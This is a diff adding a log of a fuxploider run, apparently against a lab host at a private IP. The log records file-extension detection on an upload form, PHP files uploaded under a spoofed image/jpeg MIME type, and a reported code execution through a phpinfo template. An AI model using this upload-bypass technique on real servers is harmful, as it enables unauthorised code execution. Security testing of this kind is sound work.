@@ -1,0 +1,36 @@
+2024-02-04 10:43:13 INFO - ### Starting detection of valid extensions ...
+2024-02-04 10:43:13 INFO - [1m[42mExtension jpeg seems valid for this form.[m
+2024-02-04 10:43:13 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:13 INFO - [1m[42mExtension jpg seems valid for this form.[m
+2024-02-04 10:43:13 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:13 INFO - [1m[42mExtension jpe seems valid for this form.[m
+2024-02-04 10:43:13 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:13 INFO - [1m[42mExtension png seems valid for this form.[m
+2024-02-04 10:43:13 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:14 INFO - ### Tried 100 extensions,  4 are valid.
+[1;32m
+
+ ___             _     _   _ 
+|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
+|  _| | |_'_| . | | . | | . | -_|  _|
+|_| |___|_,_|  _|_|___|_|___|___|_|
+            |_|
+
+[1m[42m{version 1.0.0}[m
+
+[m[!] legal disclaimer: Usage of fuxploider for attacking targets without
+prior mutual consent is illegal. It is the end user's responsibility to obey
+all applicable local, state and federal laws. Developers assume no liability
+and are not responsible for any misuse or damage caused by this program.
+
+[*] starting at 10:43:13
+Extensions detection: 0:00:00.127583
+Start uploading payloads? [Y/n]: 2024-02-04 10:43:14 INFO - ### Starting code execution detection (messing with file extensions and mime types...)
+2024-02-04 10:43:14 INFO - [1;32mUpload of 'tmpczud21p9.php1' with mime type image/jpeg successful[m
+2024-02-04 10:43:14 INFO - [1;32mUpload of 'tmp1sac3dtf.php' with mime type image/jpeg successful[m
+2024-02-04 10:43:14 INFO - [1;32mUpload of 'tmp0f4gd5n6.php2' with mime type image/jpeg successful[m
+2024-02-04 10:43:14 INFO - [1m[42mCode execution obtained ('.php','image/jpeg','phpinfo','http://172.22.1.3/uploads/tmp1sac3dtf.php')[m
+2024-02-04 10:43:14 INFO - 1 entry point(s) found using 122 HTTP requests.
+
+Found the following entry points: 
+[{'suffix': '.php', 'mime': 'image/jpeg', 'templateName': 'phpinfo', 'codeExecURL': None, 'dynamicPayload': None, 'payloadFilename': 'template.php', 'staticFilename': None}]
